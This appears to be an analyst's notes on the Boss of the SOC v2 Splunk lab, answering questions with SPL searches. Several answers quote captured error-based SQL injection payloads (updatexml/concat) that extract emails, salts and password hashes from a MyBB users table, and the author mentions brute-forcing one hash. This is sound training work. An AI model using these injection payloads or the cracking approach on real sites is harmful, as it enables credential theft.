@@ -1,0 +1,313 @@
+Boss Of The SOC v2 - SIEM Case Investigation
+Platform : https://cyberdefenders.org/
+
+I skipped v1 since it looks the same as the one that I did for tryhackme.
+
+In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.
+
+Hunting Scenarios:
+
+PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.
+Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP
+Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS
+Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.
+Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.
+User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.
+Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.
+Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.
+Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.
+Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.
+OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.
+Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).
+Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.
+
+==============================================================================================================================
+bots2.ova file was downloaded and used 
+
+===============================================================================================================================	
+1	This is a simple question to get you familiar with submitting answers. What is the name of the company that makes the software that you are using for this competition? Answer guidance: A six-letter word with no punctuation.
+A: Splunk
+===============================================================================================================================	
+2. Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited? Answer guidance: Do not provide the FQDN. Answer example: google.com
+
+First thing I did was search for a user with "amber" in the name
+
+	user=*amber*
+
+I noticed that 10.0.2.101 has the bulk (83%) of src_ip and is the only client_IP, so I'll try that with a sourcetype of http:stream.  Since she was looking for a competeitor's website. It would be a .com so I add that in the search as well.
+
+	src_ip="10.0.2.101" sourcetype="stream:http" site=*.com
+
+77 sites, I glanced through quickly and see 2 potential answer (berkbeer.com and finnegan.com).
+Both are just image links but Berk Beer does have ceoberk.png and may have info on the executive team
+---------------
+A: berkbeer.com
+===============================================================================================================================	
+3. Amber found the executive contact information and sent him an email. What is the CEO's name? Provide the first and last name.
+
+I searched berkbeer from sourcetype="stream:smtp
+
+	sourcetype="stream:smtp" berkbeer
+
+2 berkbeer emails showed up (hbernhard@berkbeer.com and mberk@berkbeer.com).
+
+I searched the earliest email with the content_transfer_encoding printable and the first was this:
+
+Mr. Bernhard,
+   I was very sorry to hear about the acquisition falling through. I was ve=
+ry excited to work with you in the future. I have to admit, I am a little w=
+orried about my future here. I'd love to talk to you about some information=
+ I have regarding my work.
+
+Amber Turing
+Principal Scientist
+867.322.1123
+Froth.ly
+	
+	sourcetype="stream:smtp" berkbeer "content_transfer_encoding{}"="quoted-printable" 
+	|  reverse
+	
+His response gave his last name in the email
+---------------
+A: Martin Berk
+===============================================================================================================================	
+4. After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?
+
+this was found in my research for the last question.
+---------------
+A: hbernhard@berkbeer.com
+===============================================================================================================================	
+5. What is the name of the file attachment that Amber sent to a contact at the competitor?
+
+I brought up all the berkbeer emails again and found 1 file in attach_filename" field
+	
+	sourcetype="stream:smtp" berkbeer
+---------------
+A: Saccharomyces_cerevisiae_patent.docx
+===============================================================================================================================	
+6. What is Amber's personal email address?	
+
+Since the 3 emails that I could read did not have her email,  I checked the encoded one and found her email in the meassage when I decoded with base64decode.org
+---------------
+A: ambersthebest@yeastiebeastie.com
+===============================================================================================================================	
+7. What version of TOR did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter.
+
+Knowing that its installed one time than used, I simply searched tor.exe
+
+	tor.exe
+
+I then looked at the process_name field and there it was
+
+---------------	
+A:7.0.4
+===============================================================================================================================	
+8. What is the public IPv4 address of the server running www.brewertalk.com?
+This one is an easy search
+
+	dest="www.brewertalk.com"
+
+Now I take a look at dest_ip and 2 are there but 1 is private, 
+---------------	
+A:52.42.208.228
+===============================================================================================================================
+===============================================================================================================================	
+9. Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.
+
+First thing I looked for was the user agent I searched "brewertalk.com" when I search and I found a few odd ones but no scanners listed
+
+	brewertalk.com
+
+There are a high number of 404 though in the 'http_comment section' So I will add that to the search  I want to take a look at the counts and what was tried so I run stats on my search
+
+	brewertalk.com http_comment="HTTP/1.1 404 Not Found" 
+	| stats count by url
+
+4009 differnt urls tried all beginning with (http://www.brewertalk.com/)
+
+8050 of them coming from 45.77.65.211 while the other 2 src_ip combine a total of 9
+---------------	
+A: 45.77.65.211
+===============================================================================================================================	
+10. The IP address from question 9 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php	
+
+I will search the source IP.
+	
+	src_ip="45.77.65.211"
+
+In the URL field,  I see 1188 alerts for http://www.brewertalk.com/member.php.  That seems like it might be an attack.  So Im going to add that to the search with regex and put results of possible attack in a table to verify.
+
+
+	src_ip="45.77.65.211" url="http://www.brewertalk.com/member.php" 
+	| rex field=src_content "password=(?P<attackpass>.+)&url" 
+	| rex field=src_content "username=(?P<attackuser>.+)"
+	| table attackpass attackuser 
+
+There is a lot (1188, lets break it down more for user: admin
+
+	src_ip="45.77.65.211" url="http://www.brewertalk.com/member.php" 
+	| rex field=src_content "password=(?P<attackpass>.+)&url" 
+	| rex field=src_content "username=(?P<attackuser>.+)"
+	| table attackpass attackuser 
+	| where attackuser= "admin"
+
+520 attempts. 
+1 URI Path listed.
+
+---------------
+A: member.php
+===============================================================================================================================	
+11. What SQL function is being abused on the uri path from question 10?	
+
+Before I narrowed the last question by admin, I saw something that may have been SQL_Injection.  So I will bring that back up and click on one of those events.
+in one of the user fields I saw:
+
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':23'</dd>
+
+There are 2 functions that provide basic XPATH capabilities (ExtraValue & UpdateXML).
+
+The line "WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1'",
+alets me to a injection using XPATH updateXML injections (updatexml(NULL,concat (0x3a) 
+
+---------------
+A:updateXML
+===============================================================================================================================	
+12. What is Frank Ester's password salt value on www.brewertalk.com?	
+
+First I will list all the users that
+
+	src_ip="45.77.65.211" url="http://www.brewertalk.com/member.php" 
+	| rex field=src_content "password=(?P<attackpass>.+)&url" 
+	| rex field=src_content "username=(?P<attackuser>.+)"
+	| table attackuser 
+    	| where attackuser!= "admin"
+no frank or ester
+ 
+So now I want to find out if Frank is in the SQL Database.
+	45.77.65.211" *ester* source
+
+1 event came up and he has an email in the database: <dd>1105 - XPATH syntax error: ':frankesters47@gmail.com'</dd> (found in dest_content) at 8/16/17
+3:24:52.702 PM.
+
+The error indictaes that the transaction needs more space
+
+I want to see attacks around that time so I did plus/minus 10 seconds in the time and
+	src_ip "45.77.65.211" uri_path="/member.php" dest_ip="172.31.4.249" sourcetype="stream:http" eventtype=err0r
+
+1071 events still too much, lets backtrack and do 5 seconds.
+38 events, Still more than I'd like, let's try +1 second,
+6 events, I can work with that.
+
+one event:
+<dd>1105 - XPATH syntax error: ':frankesters47@gmail.com'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
+
+
+next event:
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':8'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1'
+
+next event:
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':gGsxysZL'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT salt FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
+
+Info gettting pulled is what is getting selected in the updateXML
+
+I attempted to write Regex for it to pull a field but was having problems and will try again another day.
+---------------
+A:gGsxysZL
+===============================================================================================================================	
+13. What is user btun's password on brewertalk.com?	
+So with this one I will look for the substring and salt for btun.  Once again, I am having issues with regex so I will have to manually look for it (most recent on top)
+
+Substring:
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':f91904c1dd2723d5911eeba409cc0d1'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 2,1), 1, 31))),NULL) and '1'
+
+SALT:
+
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':tlX7cQPE'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT salt FROM mybb_users ORDER BY UID LIMIT 2,1)),NULL) and '1'
+
+EMAIL:
+
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':btun@froth.ly'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT email FROM mybb_users ORDER BY UID LIMIT 2,1)),NULL) and '1'
+
+USER: 
+
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':btun'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT username FROM mybb_users ORDER BY UID LIMIT 2,1)),NULL) and '1'
+
+
+f91904c1dd2723d5911eeba409cc0d1 124 bit
+
+It seems to be missing a character.  I will look at the next to 2 to see if they got cut
+
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':4'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 2,1), 32, 31))),NULL) and '1'
+
+
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':1'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 3,1)))),NULL) and '1'
+
+It looks like "4" was cut off the password
+
+f91904c1dd2723d5911eeba409cc0d1 128 bit = MD5
+I have to bruteforce f91904c1dd2723d5911eeba409cc0d14
+
+NO wordlist worked yet for me still trying
